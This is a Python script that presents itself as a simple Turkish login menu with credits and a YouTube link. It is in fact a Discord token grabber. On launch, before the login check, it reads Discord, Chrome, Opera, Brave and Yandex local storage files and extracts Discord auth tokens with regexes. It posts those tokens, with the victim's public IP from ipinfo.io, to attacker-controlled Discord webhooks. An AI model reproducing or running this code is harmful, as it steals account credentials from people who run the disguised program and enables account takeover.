from urllib import response
from urllib.request import Request, urlopen
import json
import requests
from discohook.client import Discohook
import os
import re
import json
from urllib.request import Request, urlopen

def get():
    endpoint = 'https://ipinfo.io/json'
    response = requests.get(endpoint, verify = True)

    if response.status_code != 200:
        return 'Status:', response.status_code, 'Problem with the request. Exiting.'
        exit()

    data = response.json()

    return data['ip']



def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens



def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass



WEBHOOK_URL = 'Webhook Url'
PING_ME = True
my_ip = get()
kullanicilar = "Admin"
sifreler = "1234"
kullaniciAdi = input("Kullanıcı Adı Giriniz : ")
sifreniz = input("Sifrenizi Giriniz : ")
webhook2 = Discohook(
    url='Your Webhook Url',
    rate_limit_retry=False,
    content="**Yeni Başarılı Giriş Algılandı İp Adresi : **"
)

webhook3 = Discohook(
    url='Your Webhook Url',
    rate_limit_retry=False,
    content="**Yeni Başarısız Giriş Algılandı İp Adresi : **"
)

main()

webhook = Discohook(
    url='Your Webhook Url',
    rate_limit_retry=False,
    content=my_ip
)

response 
response 

if kullaniciAdi == kullanicilar:
    if sifreniz == sifreler:
        print("Hoşgeldin Admin User")
        response = webhook2.execute()
        response = webhook.execute()
        secenekler = input("1-Credits \n2-My_Youtube_Channel\nSelect : ")
        if secenekler == "1":
            print("Credit By : Memati Peker#7000")
            print(input("Çıkmak İçin Enter a Bas"))
        if secenekler == "2":
            print("My Youtube Channel : https://www.youtube.com/channel/UCeh-SC7To8v7V4MysceA4EA/videos")
            print(input("Çıkmak İçin Enter a Bas"))
    else:
        print("Kullanıcı Adın Veya Şifren Yanlış !")
        response = webhook3.execute()
        response = webhook.execute()
        print(input("Çıkmak İçin Enter a Bas"))
else:
    print("Kullanıcı Adın Veya Şifren Yanlış !")
    response = webhook3.execute()
    response = webhook.execute()
    print(input("Çıkmak İçin Enter a Bas"))
